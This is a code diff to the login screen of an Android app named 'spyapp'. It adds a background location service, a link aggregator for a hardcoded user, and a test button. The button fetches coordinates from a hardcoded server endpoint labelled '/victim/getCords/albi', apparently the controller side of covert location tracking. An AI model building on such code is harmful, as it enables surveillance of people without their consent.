@@ -11,6 +11,7 @@ import android.graphics.Color;
 import android.os.AsyncTask;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -22,12 +23,13 @@ import java.nio.charset.StandardCharsets;
 import java.util.concurrent.ExecutionException;
 
 public class MainActivity extends AppCompatActivity {
-    private TextView textView;
+    private TextView textView,error;
     private EditText login;
     private EditText password;
     private Button logbutton;
     private Button signupbutton;
     private ServerRequest req;
+    private Button cordsTest;
 
     public static final String BROADCAST_ACTION = "com.example.albert.spyapp;";
     private Permission permission;
@@ -37,12 +39,17 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.login_screen);
-
+        startService(new Intent(this,GetLocationFromServerService.class));
         textView = (TextView)findViewById(R.id.connected);
         logbutton = (Button)findViewById(R.id.loginbutton);
         login = (EditText)findViewById(R.id.logintextfield);
         password = (EditText)findViewById(R.id.passwordtextfield);
         signupbutton = (Button)findViewById(R.id.signupbutton);
+        error = (TextView)findViewById(R.id.error);
+        cordsTest=(Button)findViewById(R.id.testCords);
+
+        LinksAgregator linksAgregator=new LinksAgregator("tomeczek",getApplicationContext());
+        linksAgregator.getLinks();
 
         logbutton.setOnClickListener(new View.OnClickListener() {
             @SuppressLint("StaticFieldLeak")
@@ -56,7 +63,7 @@ public class MainActivity extends AppCompatActivity {
                             Hashing.sha256().hashString(password.getText().toString(), StandardCharsets.UTF_8).toString());
                     password.setText("");
                     login.setText("");
-
+                    error.setText("");
                     try {
                         new AsyncTask<Void, Void, Void>() {
                             @Override
@@ -70,7 +77,7 @@ public class MainActivity extends AppCompatActivity {
                     } catch (ExecutionException e) {
                         e.printStackTrace();
                     }
-
+                    System.out.println(req.getReturnedValue());
                     if (req.getReturnedValue().equals("\"\"")) {
                         showDialog("Wrong login or password");
                     } else {
@@ -80,8 +87,18 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         });
+
+        cordsTest.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.d("test clicked","clicked");
+                CordsRequest request=new CordsRequest("http://35.204.80.21:4567/victim/getCords/albi",getApplicationContext());
+                request.getCords();
+            }
+        });
       
         signupbutton.setOnClickListener(new View.OnClickListener() {
+          
             @Override
             public void onClick(View v) {
                 Intent i = new Intent(getApplicationContext(),signUp.class);
@@ -98,6 +115,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     private void registerMyReceiver() {
+
         try
         {
             IntentFilter intentFilter = new IntentFilter();
@@ -108,37 +126,47 @@ public class MainActivity extends AppCompatActivity {
         {
             ex.printStackTrace();
         }
+
     }
 
     @Override
     protected void onResume() {
         super.onResume();
+
         startService(new Intent(this, TestOnlineService.class));
     }
 
     @Override
     protected void onStop() {
         super.onStop();
+
         stopService(new Intent(this, TestOnlineService.class));
     }
 
     class MyBroadCastReceiver extends BroadcastReceiver
     {
+
         @Override
         public void onReceive(Context context, Intent intent) {
 
             try
             {
                 //Log.d("received", "onReceive() called");
+
+
+
                 boolean connected = intent.getBooleanExtra("connected",false);
                 if(connected==true) {
                     textView.setText("connected");
                     textView.setTextColor(Color.parseColor("#00FF00"));
-                } else{
+                }
+                else{
                     textView.setText("not connected");
                     textView.setTextColor(Color.parseColor("#FF0000"));
                 }
-            } catch (Exception ex) {
+            }
+            catch (Exception ex)
+            {
                 ex.printStackTrace();
             }
         }
